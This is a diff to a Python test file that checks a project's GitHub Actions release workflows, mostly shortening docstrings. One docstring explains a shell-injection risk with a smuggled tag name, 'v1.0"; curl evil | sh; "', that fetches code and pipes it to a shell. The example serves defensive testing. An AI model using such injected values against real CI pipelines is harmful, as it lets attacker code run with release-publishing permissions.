@@ -1,30 +1,13 @@
 """Pins the release workflows' dispatch-publish wiring.
 
-Invariant: a release is publishable straight from the Actions tab — main-only,
-version-asserted — without cutting a tag by hand. Two workflows carry that
-capability and this test keeps their moving parts from drifting:
+Invariant: a release is publishable straight from the Actions tab,
+main-only and version-asserted, across ``windows-package.yml`` (dispatch,
+provenance attestation, unsigned-installer labeling, #282) and
+``release.yml`` (PyPI Trusted Publishing).
 
-  * ``windows-package.yml`` gains a boolean ``publish`` dispatch input; its
-    write-scoped release job fires on a version tag OR on a dispatch that opts
-    in; and the gh-release step creates tag ``v<version>`` at this run's SHA
-    (``tag_name`` + ``target_commitish``) while still flagging pre-1.0 builds
-    as prereleases. That same job attests build provenance for the exe and
-    its SBOM (matching the PyPI path's ``attest-build-provenance`` use below)
-    and labels the installer unsigned in the release notes until a signing
-    certificate exists (#282).
-  * ``release.yml`` (PyPI Trusted Publishing) is itself dispatchable — a tag
-    created with GITHUB_TOKEN does not cascade-trigger its push trigger — and
-    its first build step refuses a dispatch from any ref but main.
-
-It also pins one security property across EVERY workflow: attacker-shaped
-context values (ref and tag names above all) never reach a ``run:`` script
-through ``${{ }}`` interpolation — git permits ``"``, ``;``, ``$`` and
-backticks in a ref name and the ``v*`` tag filter accepts them, so an
-interpolated ref is shell injection inside jobs that hold ``id-token: write``
-and ``contents: write``. They travel by ``env:`` and are referenced quoted.
-
-If the wiring is re-shaped, update both workflows and this test together.
-"""
+Also pins one security property across EVERY workflow: a ref/tag name
+must never reach a ``run:`` script through ``${{ }}`` interpolation, only
+a quoted ``env:`` value."""
 
 from __future__ import annotations
 
@@ -190,12 +173,10 @@ def _step_index(steps: list[dict[str, Any]], marker: str) -> int:
 
 
 def test_release_yml_asserts_tag_matches_built_version_before_building() -> None:
-    """A mistyped `v*` tag must fail BEFORE anything is built or published.
-
-    PyPI publishes whatever version the SOURCE carries, so without this guard
-    a stale tag mints a release whose tag, artifacts, and index disagree —
-    the same invariant windows-package.yml already enforces on its path.
-    """
+    """A mistyped `v*` tag must fail BEFORE anything is built or
+    published: PyPI publishes whatever version the SOURCE carries, so an
+    unguarded stale tag would mint a release whose tag, artifacts, and
+    index disagree — the same invariant windows-package.yml enforces."""
     data = _load(RELEASE_YML)
     steps = data["jobs"]["build"]["steps"]
     guard = _step_index(steps, "tag names the version")
@@ -217,13 +198,10 @@ def test_release_yml_asserts_tag_matches_built_version_before_building() -> None
 
 
 def test_release_yml_asserts_wheel_carries_third_party_licenses() -> None:
-    """The built wheel must carry the Apache-2.0 and OFL-1.1 full texts.
-
-    The wheel redistributes the HL7 CDA stylesheet and the two GUI fonts;
-    pyproject's license-files places the texts under dist-info/licenses/, and
-    this workflow step is what keeps a packaging-config regression from
-    shipping a wheel stripped of the attributions it owes.
-    """
+    """The built wheel must carry the Apache-2.0 and OFL-1.1 full texts:
+    it redistributes the HL7 CDA stylesheet and the two GUI fonts, and
+    this step is what keeps a packaging-config regression from shipping a
+    wheel stripped of the attributions it owes."""
     data = _load(RELEASE_YML)
     steps = data["jobs"]["build"]["steps"]
     build = _step_index(steps, "python -m build")
@@ -249,15 +227,11 @@ def _run_blocks(path: Path) -> list[tuple[str, str]]:
 
 
 def test_workflow_run_blocks_never_interpolate_untrusted_context() -> None:
-    """No ``run:`` script may interpolate a ref/tag name or a dispatch input.
-
-    ``${{ github.ref_name }}`` inside a script is substituted BEFORE bash sees
-    it, so a tag named ``v1.0"; curl evil | sh; "`` executes inside a job that
-    holds ``id-token: write`` (PyPI Trusted Publishing) or ``contents: write``
-    (the GitHub release upload). The safe form is an ``env:`` entry on the step
-    and a quoted ``"$REF_NAME"`` in the script — bash then treats the value as
-    data, whatever it contains.
-    """
+    """No ``run:`` script may interpolate a ref/tag name or a dispatch
+    input: ``${{ github.ref_name }}`` is substituted BEFORE bash sees it,
+    so a tag named ``v1.0"; curl evil | sh; "`` executes inside a job
+    holding ``id-token``/``contents: write``. The safe form is an
+    ``env:`` entry and a quoted ``"$REF_NAME"`` in the script."""
     offenders: list[str] = []
     for workflow in sorted(WORKFLOW_DIR.glob("*.yml")):
         for label, script in _run_blocks(workflow):
